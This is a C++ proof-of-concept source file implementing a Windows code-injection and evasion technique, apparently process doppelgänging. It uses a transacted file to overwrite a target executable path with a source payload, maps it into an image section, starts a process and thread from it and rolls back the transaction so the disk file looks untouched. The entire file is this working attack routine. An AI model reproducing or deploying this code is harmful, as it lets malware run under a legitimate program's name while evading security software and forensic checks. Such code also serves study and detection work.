#include <stdafx.h>
#include <iostream>

#include "WinApi.h"
#include "WinInternals.h"

int wmain(int argc, const wchar_t* argv[])
{
	if (argc < 3)
	{
		std::cout << "[destination] [source] parameters are expected!" << std::endl;

		//const auto path = L"X:\\Share\\PEview\\PEview.exe";
		//WCHAR commandLine[MAX_PATH];
		//wcscpy_s(commandLine, path);
		//STARTUPINFO si = { 0 };
		//PROCESS_INFORMATION  pi = { 0 };
		//si.cb = sizeof(si);
		//::CreateProcessW(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

		return ERROR_INVALID_PARAMETER;
	}
	try
	{
		const auto targetPath = argv[1];
		const auto sourcePath = argv[2];
		std::wcout << L"Target: " << targetPath << std::endl;
		std::wcout << L"Source: " << sourcePath << std::endl;

		using namespace PoC;

		std::cout << "Let's check if all required functions are located" << std::endl;
		CheckIfAllFunctionsAreAvailable();

		std::cout << "Let's create transaction" << std::endl;
		auto transaction = Transaction::Create();

		USHORT miniVersion = TXFS_MINIVERSION_DIRTY_VIEW;
		const Handle destFile = ::CreateFileTransactedW
		(
			targetPath,
			GENERIC_READ | GENERIC_WRITE, // dwDesiredAccess [in]
			FILE_SHARE_READ,              // dwShareMode [in] - TODO: check other values
			NULL,                         // lpSecurityAttributes [in, optional]
			CREATE_ALWAYS,                // dwCreationDisposition [in]
			FILE_ATTRIBUTE_NORMAL,        // dwFlagsAndAttributes [in]
			NULL,                         // hTemplateFile [in, optional]
			transaction,                  // hTransaction [in]
			&miniVersion,                 // pusMiniVersion [in, optional]
			NULL                          // pExtendedParameter - This parameter is reserved and must be NULL.
		);

		const Handle sourceFile = ::CreateFileW
		(
			sourcePath,
			GENERIC_READ,          // dwDesiredAccess [in]
			FILE_SHARE_READ,       // dwShareMode [in]
			NULL,                  // lpSecurityAttributes [in, optional]
			OPEN_EXISTING,         // dwCreationDisposition [in]
			FILE_ATTRIBUTE_NORMAL, // dwFlagsAndAttributes [in]
			NULL                   // hTemplateFile [in, optional]
		);

		std::cout << "Let's copy content" << std::endl;
		CopyFileContent(destFile, sourceFile);

		std::cout << "Let's create section" << std::endl;
		auto section = Section::Create(destFile);
		const auto entryPoint = section.GetEntryPoint();

		std::cout << "Let's create process" << std::endl;
		auto process = Process::Create(section);

		std::cout << "Let's create thread" << std::endl;
		auto thread = Thread::Create(targetPath, process, entryPoint);

		std::cout << "Let's resume thread" << std::endl;
		thread.Resume();

		std::cout << "Let's rollback transation" << std::endl;
		transaction.Rollback();

		std::cout << "Let's exit" << std::endl;
		return 0;
	}
	catch (long status)
	{
		std::cout << "Status: " << std::hex << status << std::endl;
		return status;
	}
	catch (const char* error)
	{
		std::cout << "Error: " << error << std::endl;
		return ERROR_BAD_FUNCTION_TABLE;
	}
}

